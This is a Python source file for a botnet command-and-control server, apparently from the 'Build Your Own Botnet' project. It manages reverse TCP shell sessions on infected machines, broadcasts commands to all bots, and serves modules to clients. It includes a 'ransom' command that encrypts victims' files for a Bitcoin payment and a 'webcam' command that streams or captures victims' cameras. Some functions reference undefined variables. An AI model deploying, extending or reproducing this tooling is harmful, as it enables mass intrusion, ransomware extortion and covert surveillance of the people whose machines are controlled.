#!/usr/bin/python
# -*- coding: utf-8 -*-
'Command & Control (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import json
import Queue
import pickle
import socket
import struct
import base64
import random
import logging
import argparse
import datetime
import threading
import subprocess
import collections
import multiprocessing

# modules
import core.util as util
import core.database as database
import core.security as security

# globals
packages = ['cv2','colorama','SocketServer']
platforms = ['win32','linux2','darwin']

# setup
util.is_compatible(platforms, __name__)
util.imports(packages, globals())

# globals
__threads = {}
__abort = False
__debug = bool('--debug' in sys.argv)
__banner__ = """ 

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

"""
try:
    import colorama
    colorama.init(autoreset=True)
except ImportError:
   util.log("installing required Python package 'colorama'...")
   execfile('setup.py')
   util.log("restarting...")
   os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])

# main
def main():
    parser = argparse.ArgumentParser(
        prog='server.py',
        version='0.1.5',
        description="Command & Control Server (Build Your Own Botnet)")

    parser.add_argument(
        '--host',
        action='store',
        type=str,
        default='0.0.0.0',
        help='server hostname or IP address')

    parser.add_argument(
        '--port',
        action='store',
        type=int,
        default=1337,
        help='server port number')

    parser.add_argument(
        '--database',
        action='store',
        type=str,
        default='database.db',
        help='SQLite database')

    modules = os.path.abspath('modules')
    packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
    
    if not len(packages):
        util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
        sys.exit(0)

    packages = packages[0]
    options = parser.parse_args()

    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
    globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)

    c2.run()


class C2():
    """ 
    Console-based command & control server with a streamlined user-interface for controlling clients
    with reverse TCP shells which provide direct terminal access to the client host machines, as well
    as handling session authentication & management, serving up any scripts/modules/packages requested
    by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
    incoming completed tasks from clients
    
    """

    _lock = threading.Lock()
    _text_color = 'WHITE'
    _text_style = 'NORMAL'
    _prompt_color = 'WHITE'
    _prompt_style = 'BRIGHT'

    def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
        """ 
        Create a new Command & Control server

        `Optional`
        :param str db:      SQLite database
                                :memory: (session)
                                *.db     (persistent)

        Returns a byob.server.C2 instance
        
        """
        self._active = threading.Event()
        self._count = 1
        self._prompt = None
        self._database = db
        self.current_session = None
        self.sessions = {}
        self.socket = self._socket(port)
        self.banner = self._banner()
        self.commands = {
            'set' : {
                'method': self.set,
                'usage': 'set <setting> [option=value]',
                'description': 'change the value of a setting'},
            'help' : {
                'method': self.help,
                'usage': 'help',
                'description': 'show usage help for server commands'},
            'exit' : {
                'method': self.quit,
                'usage': 'exit',
                'description': 'quit the server'},
            'eval' : {
                'method': self.eval,
                'usage': 'eval <code>',
                'description': 'execute python code directly on server (debugging MUST be enabled)'},
            'query' : {
                'method': self.query,
                'usage': 'query <statement>',
                'description': 'query the SQLite database'},
            'options' : {
                'method': self.settings,
                'usage': 'options',
                'description': 'show currently configured settings'},
            'sessions' : {
                'method': self.session_list,
                'usage': 'sessions',
                'description': 'show active client sessions'},
            'clients' : {
                'method': self.session_list,
                'usage': 'clients',
                'description': 'show all clients that have joined the server'},
            'shell' : {
                'method': self.session_shell,
                'usage': 'shell <id>',
                'description': 'interact with a client with a reverse TCP shell through an active session'},
            'ransom' : {
                'method': self.session_ransom,
                'usage': 'ransom [id]',
                'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
            'webcam' : {
                'method': self.session_webcam,
                'usage': 'webcam <mode>',
                'description': 'capture image/video from the webcam of a client device'},
            'kill' : {
                'method': self.session_remove,
                'usage': 'kill <id>',
                'description': 'end a session'},
            'bg' : {
                'method': self.session_background,
                'usage': 'bg [id]',
                'description': 'background a session (default: the current session)'},
            'broadcast' : {
                'method': self.task_broadcast,
                'usage': 'broadcast <command>',
                'description': 'broadcast a task to all active sessions'},
            'results': {
                'method': self.task_list,
                'usage': 'results [id]',
                'description': 'display all completed task results for a client (default: all clients)'},
            'tasks' : {
                'method': self.task_list,
                'usage': 'tasks [id]',
                'description': 'display all incomplete tasks for a client (default: all clients)'}}

    def _print(self, info):
        lock = self.current_session._lock if self.current_session else self._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        if len(str(info.get(key))) > 80:
                            info[key] = str(info.get(key))[:77] + '...'
                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
                        util.display('\x20' * 4, end=',')
                        util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        else:
            with lock:
                util.display('\x20' * 4, end=',')
                util.display(str(info), color=self._text_color, style=self._text_style)

    def _socket(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(100)
        return s

    def _return(self, data=None):
        lock, prompt = (self.current_session._lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
        with lock:
            if data:
                util.display('\n{}\n'.format(data))
            util.display(prompt, end=',')

    def _banner(self):
        with self._lock:
            util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
            util.display("[?] ", color='yellow', style='bright', end=',')
            util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
        return __banner__

    def _get_arguments(self, data):
        args = tuple([i.strip('-') for i in str(data).split() if '=' not in i])
        kwds = dict({i.partition('=')[0].strip('-'): i.partition('=')[2].strip('-') for i in str(data).split() if '=' in i})
        return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)

    def _get_session_by_id(self, session):
        session = None
        if str(session).isdigit() and int(session) in self.sessions:
            session = self.sessions[int(session)]
        elif self.current_session:
            session = self.current_session
        else:
            util.log("Invalid Client ID")
        return session

    def _get_session_by_connection(self, connection):
        session = None
        if isinstance(connection, socket.socket):
            peer = connection.getpeername()[0]
            for s in self.get_sessions():
                if s.connection.getpeername()[0] == peer:
                    session = s
                    break
            else:
                util.log("session not found for: {}".format(peer))
        else:
            util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
        return session

    def _get_prompt(self, data):
        with self._lock:
            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())

    def eval(self, code):
        """ 
        Execute code directly in the context of the currently running process

        `Requires`
        :param str code:    Python code to execute
        
        """
        if globals()['__debug']:
            try:
                print eval(code)
            except Exception as e:
                util.log("Error: %s" % str(e))
        else:
            util.log("Debugging mode is disabled")

    def quit(self):
        """ 
        Quit server and optionally keep clients alive
        
        """
        globals()['package_handler'].terminate()
        globals()['module_handler'].terminate()
        if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
            for session in self.sessions.values():
                session._active.set()
                session.send_task('passive')
        globals()['__abort'] = True
        self._active.clear()
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
        util.display('Exiting...')
        sys.exit(0)

    def help(self, info=None):
        """ 
        Show usage information

        `Optional`
        :param dict info:   client usage help
        
        """
        column1 = 'command <arg>'
        column2 = 'description'
        info = info if info else {command['usage']: command['description'] for command in self.commands.values()}
        max_key = max(map(len, info.keys() + [column1])) + 2
        max_val = max(map(len, info.values() + [column2])) + 2
        util.display('\n', end=',')
        util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
        for key in sorted(info):
            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        util.display("\n", end=',')

    def display(self, info):
        """ 
        Display formatted output in the console

        `Required`
        :param str info:   text to display

        """
        with self._lock:
            print
            if isinstance(info, dict):
                if len(info):
                    self._print(info)
            elif isinstance(info, list):
                if len(info):
                    for data in info:
                        util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
                        self._print(data)
            elif isinstance(info, str):
                try:
                    self._print(json.loads(info))
                except:
                    util.display(str(info), color=self._text_color, style=self._text_style)
            else:
                util.log("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
            print

    def query(self, statement):
        """ 
        Query the database

        `Requires`
        :param str statement:    SQL statement to execute

        """
        self.database.execute_query(statement, returns=False, display=True)

    def settings(self):
        """
        Show the server's currently configured settings
        
        """
        text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
        text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
        prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
        prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
        util.display('\n\t    OPTIONS', color='white', style='bright')
        util.display('text color/style: ', color='white', style='normal', end=',')
        util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
        util.display('prompt color/style: ', color='white', style='normal', end=',')
        util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
        util.display('debug: ', color='white', style='normal', end=',')
        util.display('True\n' if globals()['__debug'] else 'False\n', color='green' if globals()['__debug'] else 'red', style='normal')

    def set(self, args=None):
        """ 
        Set display settings for the command & control console

        Usage: `set [setting] [option]=[value]`

            :setting text:      text displayed in console
            :setting prompt:    prompt displayed in shells

            :option color:      color attribute of a setting
            :option style:      style attribute of a setting

            :values color:      red, green, cyan, yellow, magenta
            :values style:      normal, bright, dim

        Example 1:         `set text color=green style=normal`
        Example 2:         `set prompt color=white style=bright`

        """
        if args:
            arguments = self._get_arguments(args)
            args, kwargs = arguments.args, arguments.kwargs
            if arguments.args:
                target = args[0]
                args = args[1:]
                if target in ('debug','debugging'):
                    if args:
                        setting = args[0]
                        if setting.lower() in ('0','off','false','disable'):
                            globals()['__debug'] = False
                        elif setting.lower() in ('1','on','true','enable'):
                            globals()['__debug'] = True
                        util.display("\n[+]" if globals()['__debug'] else "\n[-]", color='green' if globals()['__debug'] else 'red', style='normal', end=',')
                        util.display("Debug: {}\n".format("ON" if globals()['__debug'] else "OFF"), color='white', style='bright')
                        return
                for setting, option in arguments.kwargs.items():
                    option = option.upper()
                    if target == 'prompt':
                        if setting == 'color':
                            if hasattr(colorama.Fore, option):
                                self._prompt_color = option
                        elif setting == 'style':
                            if hasattr(colorama.Style, option):
                                self._prompt_style = option
                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=',')
                        util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
                        return
                    elif target == 'text':
                        if setting == 'color':
                            if hasattr(colorama.Fore, option):
                                self._text_color = option
                        elif setting == 'style':
                            if hasattr(colorama.Style, option):
                                self._text_style = option
                        util.display("\ntext color/style changed to ", color='white', style='bright', end=',')
                        util.display(option + '\n', color=self._text_color, style=self._text_style)
                        return
        util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)

    def task_list(self, id=None):
        """ 
        List client tasks and results

        `Requires`
        :param int id:   session ID
        
        """
        lock = self.current_session._lock if self.current_session else self._lock
        tasks = self.database.get_tasks()
        with lock:
            print
            self.database._display(tasks)        
            print

    def task_broadcast(self, command):
        """ 
        Broadcast a task to all sessions

        `Requires`
        :param str command:   command to broadcast

        """
        sessions = self.sessions.values()
        send_tasks = [session.send_task(command) for session in sessions]
        recv_tasks = {session: session.recv_task() for session in sessions}
        for session, task in recv_tasks.items():
            if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
                session._prompt = task.get('result')
            elif task.get('result'):
                self.display(task.get('result'))
        self._return()

    def session_webcam(self, args=''):
        """ 
        Interact with a client webcam

        `Optional`
        :param str args:   stream [port], image, video

        """
        if not self.current_session:
            util.log( "No client selected")
            return
        client = self.current_session
        result = ''
        mode, _, arg = args.partition(' ')
        client._active.clear()
        if not mode or str(mode).lower() == 'stream':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            retries = 5
            while retries > 0:
                try:
                    port = random.randint(6000,9999)
                    s.bind(('0.0.0.0', port))
                    s.listen(1)
                    cmd = 'webcam stream {}'.format(port)
                    client.send_task(cmd)
                    conn, addr = s.accept()
                    break
                except:
                    retries -= 1
            header_size = struct.calcsize("L")
            window_name = addr[0]
            cv2.namedWindow(window_name)
            data = ""
            try:
                while True:
                    while len(data) < header_size:
                        data += conn.recv(4096)
                    packed_msg_size = data[:header_size]
                    data = data[header_size:]
                    msg_size = struct.unpack(">L", packed_msg_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame = pickle.loads(frame_data)
                    cv2.imshow(window_name, frame)
                    key = cv2.waitKey(70)
                    if key == 32:
                        break
            finally:
                conn.close()
                cv2.destroyAllWindows()
                result = 'Webcam stream ended'
        else:
            client.send_task("webcam %s" % args)
            task = client.recv_task()
            result = task.get('result')
        util.display(result)

    def session_remove(self, session):
        """ 
        Shutdown client shell and remove client from database

        `Requires`
        :param int session:   session ID

        """
        if not str(session).isdigit() or int(session) not in self.sessions:
            return
        else:
            # select session
            session = self.sessions[int(session)]
            session._active.clear()
            # send kill command to client
            session.send_task({"task": "kill", "session": session.info.get('uid')})
            # shutdown the connection
            session.connection.shutdown(socket.SHUT_RDWR)
            session.connection.close()
            # update current sessions
            _ = self.sessions.pop(int(session), None)
            # update persistent database
            self.database.update_status(self.info.get('uid'), 0)
            util.display(self._text_color + self._text_style)
            if not self.current_session:
                with self._lock:
                    util.display('Session {} disconnected'.format(session))
                self._active.set()
                session._active.clear()
                return self.run()
            elif int(session) == self.current_session.session:
                with self.current_session._lock:
                    util.display('Session {} disconnected'.format(session))
                self._active.clear()
                self.current_session._active.set()
                return self.current_session.run()
            else:
                with self._lock:
                    util.display('Session {} disconnected'.format(session))
                self._active.clear()
                self.current_session._active.set()
                return self.current_session.run()

    def session_list(self, verbose=True):
        """ 
        List currently online clients

        `Optional`
        :param str verbose:   verbose output (default: False)

        """
        lock = self.current_session._lock if self.current_session else self._lock
        with lock:
            print
            sessions = self.database.get_sessions(verbose=verbose)
            self.database._display(sessions)
            print

    def session_ransom(self, args=None):
        """ 
        Encrypt and ransom files on client machine

        `Required`
        :param str args:    encrypt, decrypt, payment

        """
        if self.current_session:
            if 'decrypt' in str(args):
                self.current_session.send_task("ransom decrypt %s" % key.exportKey())
            elif 'encrypt' in str(args):
                self.current_session.send_task("ransom %s" % args)
            else:
                util.log("Error: invalid option '%s'" % args)
        else:
            util.log("No client selected")

    def session_shell(self, session):
        """ 
        Interact with a client session through a reverse TCP shell

        `Requires`
        :param int session:   session ID

        """
        if not str(session).isdigit() or int(session) not in self.sessions:
            util.log("Session '{}' does not exist".format(session))
        else:
            self._active.clear()
            if self.current_session:
                self.current_session._active.clear()
            self.current_session = self.sessions[int(session)]
            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(self.current_session.id), color='white', style='normal')
            self.current_session._active.set()
            return self.current_session.run()

    def session_background(self, session=None):
        """ 
        Send a session to background

        `Requires`
        :param int session:   session ID

        """
        if not session:
            if self.current_session:
                self.current_session._active.clear()
        elif str(session).isdigit() and int(session) in self.sessions:
            self.sessions[int(session)]._active.clear()
        self.current_session = None
        self._active.set()

    @util.threaded
    def serve_until_stopped(self):
        self.database = database.Database(self._database)
        while True:
            connection, address = self.socket.accept()
            session = Session(connection=connection, id=self._count)
            util.display("\n\n[+]", color='green', style='bright', end=',')
            util.display("New Connection:", color='white', style='bright', end=',')
            util.display(address[0], color='white', style='normal')
            util.display("    Session:", color='white', style='bright', end=',')
            util.display(str(self._count), color='white', style='normal')
            util.display("    Started:", color='white', style='bright', end=',')
            util.display(time.ctime(session._created) + "\n", color='white', style='normal')
            info = self.database.handle_session(session.info)
            if isinstance(info, dict):
                session.info = info
            self.sessions[self._count] = session
            self._count += 1

            prompt = self.current_session._prompt if self.current_session else self._prompt
            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
            abort = globals()['__abort']
            if abort:
                break

    def run(self):
        """ 
        Run C2 server administration terminal

        """
        self._active.set()
        if 'c2' not in globals()['__threads']:
            globals()['__threads']['c2'] = self.serve_until_stopped()
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                cmd_buffer = self._get_prompt(self._prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action = cmd_buffer.partition(' ')
                    if cmd in self.commands:
                        try:
                            output = self.commands[cmd]['method'](action) if len(action) else self.commands[cmd]['method']()
                        except Exception as e1:
                            output = str(e1)
                    elif cmd == 'cd':
                        try:
                            os.chdir(action)
                        except: pass
                    else:
                        try:
                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                        except: pass
                    if output:
                        util.display(str(output))
                if globals()['__abort']:
                    break
            except KeyboardInterrupt:
                self._active.clear()
                break
        self.quit()


class Session(threading.Thread):
    """ 
    A subclass of threading.Thread that is designed to handle an
    incoming connection by creating an new authenticated session 
    for the encrypted connection of the reverse TCP shell

    """

    def __init__(self, connection=None, id=1):
        """
        Create a new Session 

        `Requires`
        :param connection:  socket.socket object

        `Optional`
        :param int id:      session ID

        """
        super(Session, self).__init__()
        self._prompt = None
        self._lock = threading.Lock()
        self._active = threading.Event()
        self._created = time.time()
        self.connection = connection
        self.id = id
        self.key = security.diffiehellman(self.connection)
        self.info = self.recv_task()

    def kill(self):
        """ 
        Kill the reverse TCP shell session

        """
        self._active.clear()
        globals()['c2'].session_remove(self.id)
        globals()['c2'].current_session = None
        globals()['c2']._active.set()
        globals()['c2'].run()

    def client_info(self):
        """
        Get information about the client host machine
        to identify the session
        
        """
        header_size = struct.calcsize("!L")
        header = self.connection.recv(header_size)
        msg_size = struct.unpack("!L", header)[0]
        msg = self.connection.recv(msg_size)
        data = security.decrypt_aes(msg, self.key)
        info = json.loads(data)
        return info

    def status(self):
        """ 
        Check the status and duration of the session
        
        """
        c = time.time() - float(self._created)
        data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])

    def send_task(self, task):
        """ 
        Send task results to the server

        `Requires`
        :param dict task:
          :attr str uid:             task ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr str session:         session ID assigned by server
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        if not isinstance(task, dict):
            raise TypeError('task must be a dictionary object')
        if not 'session' in task:
            task['session'] = self.info.get('uid')
        data = security.encrypt_aes(json.dumps(task), self.key)
        msg  = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return True

    def recv_task(self):
        """ 
        Receive and decrypt incoming task from server

        :returns dict task:
          :attr str uid:             task ID assigned by server
          :attr str session:         client ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        """
        header_size = struct.calcsize('!L')
        header = self.connection.recv(header_size)
        msg_size = struct.unpack('!L', header)[0]
        msg = self.connection.recv(msg_size)
        data = security.decrypt_aes(msg, self.key)
        return json.loads(data)

    def run(self):
        """ 
        Handle the server-side of the session's reverse TCP shell

        """
        while True:
            try:
                if self._active.wait():
                    task = self.recv_task() if not self._prompt else self._prompt
                    if 'help' in task.get('task'):
                        self._active.clear()
                        globals()['c2'].help(task.get('result'))
                        self._active.set()
                    elif 'prompt' in task.get('task'):
                        self._prompt = task
                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue
                        elif cmd in globals()['c2'].commands and cmd != 'help':
                            result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
                            if result:
                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                globals()['c2'].display(result.encode())
                                globals()['c2'].database.handle_task(task)
                            continue
                        else:
                            task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
                            self.send_task(task)
                    elif 'result' in task:
                        if task.get('result') and task.get('result') != 'None':
                            globals()['c2'].display(task.get('result').encode())
                            globals()['c2'].database.handle_task(task)
                    else:
                        if self._abort:
                            break
                    self._prompt = None
            except Exception as e:
                util.log(str(e))
                break
        time.sleep(1)
        globals()['c2'].session_remove(self.id)
        self._active.clear()
        globals()['c2']._return()


if __name__ == '__main__':
    main()
